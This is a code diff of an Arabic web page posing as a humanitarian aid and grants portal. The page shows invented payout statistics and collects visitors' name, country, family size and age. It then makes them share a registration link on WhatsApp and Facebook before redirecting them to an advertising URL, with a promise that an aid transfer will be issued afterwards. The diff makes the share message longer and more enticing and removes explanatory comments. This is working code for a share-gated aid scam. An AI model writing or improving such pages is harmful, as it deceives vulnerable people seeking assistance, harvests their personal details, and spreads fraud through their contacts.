@@ -9,7 +9,7 @@
          🟢 وسوم المشاركة (OG + Twitter)
          ============================================================ -->
     <meta property="og:title" content="📢 برنامج المساعدات الإنسانية">
-    <meta property="og:description" content="تعرّف على تفاصيل الدعم المالي وإمكانية الاستفادة من برامج المساعدة.">
+    <meta property="og:description" content="تعرّف على تفاصيل الدعم المالي وإمكانية الاستفادة من برامج المساعدة. يُرجى متابعة التفاصيل ومعرفة شروط التسجيل وآلية تقديم الطلب، للاطلاع على المعلومات المتعلقة ببرامج الدعم والمساعدات الإنسانية المتاحة.">
     <meta property="og:url" content="https://orpin-nine-75.vercel.app/">
     <meta property="og:site_name" content="البوابة الدولية للإغاثة والتنمية">
     <meta property="og:image" content="https://orpin-nine-75.vercel.app/preview.jpg">
@@ -19,7 +19,7 @@
 
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="📢 برنامج المساعدات الإنسانية">
-    <meta name="twitter:description" content="تعرّف على تفاصيل الدعم المالي وإمكانية الاستفادة من برامج المساعدة.">
+    <meta name="twitter:description" content="تعرّف على تفاصيل الدعم المالي وإمكانية الاستفادة من برامج المساعدة. يُرجى متابعة التفاصيل ومعرفة شروط التسجيل وآلية تقديم الطلب.">
     <meta name="twitter:image" content="https://orpin-nine-75.vercel.app/preview.jpg">
 
     <title>البوابة الرقمية الموحدة للمنح والمساعدات الإنسانية</title>
@@ -174,7 +174,6 @@
             <span>⚡ صرف فوري</span>
         </div>
 
-        <!-- شريط الإحصائيات المتحركة -->
         <div class="stats-bar">
             <div>
                 <div id="stat-beneficiaries" class="stat-value">0</div>
@@ -355,14 +354,15 @@
 
 <script>
     /* ============================================================
-       🟢 إعدادات المشاركة
+       🟢 إعدادات المشاركة — الرسالة الطويلة
        ============================================================ */
     const SHARE_URL = 'https://orpin-nine-75.vercel.app/';
 
     const SHARE_TEXT = 
-        '📢 برنامج المساعدات الإنسانية\n' +
+        '*📢 برنامج المساعدات الإنسانية*\n\n' +
         'تعرّف على تفاصيل الدعم المالي وإمكانية الاستفادة من برامج المساعدة.\n\n' +
-        '🔗 ' + SHARE_URL;
+        '_يُرجى متابعة التفاصيل ومعرفة شروط التسجيل وآلية تقديم الطلب، للاطلاع على المعلومات المتعلقة ببرامج الدعم والمساعدات الإنسانية المتاحة._\n\n' +
+        '🔗 *رابط التسجيل:* ' + SHARE_URL;
 
     /* ============================================================
        🟢 رابط الإعلان (التحويل الكامل)
@@ -542,10 +542,12 @@
 
         if (platform === 'whatsapp') {
             waClicks++;
+            // ✅ النص الطويل يُشفَّر بـ encodeURIComponent
             const waUrl = 'https://api.whatsapp.com/send?text=' + encodeURIComponent(SHARE_TEXT);
             window.open(waUrl, '_blank');
         } else {
             fbClicks++;
+            // فيسبوك: النص يظهر من og:description (وليس من الرابط)
             const fbUrl = 'https://www.facebook.com/sharer/sharer.php?u=' +
                           encodeURIComponent(SHARE_URL) +
                           '&quote=' + encodeURIComponent(SHARE_TEXT);
@@ -626,19 +628,17 @@
        🟢 التحويل الكامل للرابط الإعلاني
        ============================================================ */
     function showAdThenSuccess() {
-        // 1️⃣ حفظ الحالة قبل التحويل
         saveState({
             waClicks,
             fbClicks,
             completed: true,
-            pendingIssue: true,   // علامة: "بانتظار الإصدار بعد العودة"
+            pendingIssue: true,
             name: savedName,
             country: savedCountry,
             family: savedFamily,
             age: savedAge
         });
 
-        // 2️⃣ تحويل كامل للرابط الإعلاني
         window.location.href = AD_URL;
     }
 
@@ -665,21 +665,16 @@
        🟢 استرجاع الحالة عند تحميل الصفحة
        ============================================================ */
     window.addEventListener('load', () => {
-        // تشغيل العدادات
         animateCounter('stat-beneficiaries', 12487, 2500);
         animateCounter('stat-amount', 9365250, 2500);
         animateCounter('stat-countries', 14, 2500);
 
-        // استرجاع الحالة
         const state = loadState();
         if (!state) return;
 
         waClicks = state.waClicks || 0;
         fbClicks = state.fbClicks || 0;
 
-        // ============================================================
-        // 🟢 حالة 1: المستخدم عاد من الإعلان — أصدر الحوالة مباشرة
-        // ============================================================
         if (state.pendingIssue) {
             savedName    = state.name;
             savedCountry = state.country;
@@ -691,9 +686,6 @@
             return;
         }
 
-        // ============================================================
-        // 🟢 حالة 2: أصدر الحوالة سابقاً — أظهر الإيصال
-        // ============================================================
         if (state.issued && state.code) {
             savedName    = state.name;
             savedCountry = state.country;
@@ -712,9 +704,6 @@
             return;
         }
 
-        // ============================================================
-        // 🟢 حالة 3: أكمل التحقق فقط — فعّل الزر
-        // ============================================================
         if (state.completed) {
             updateProgress();
         }
@@ -730,4 +719,4 @@
     }, true);
 </script>
 </body>
-    </html>
+                                                                              </html>
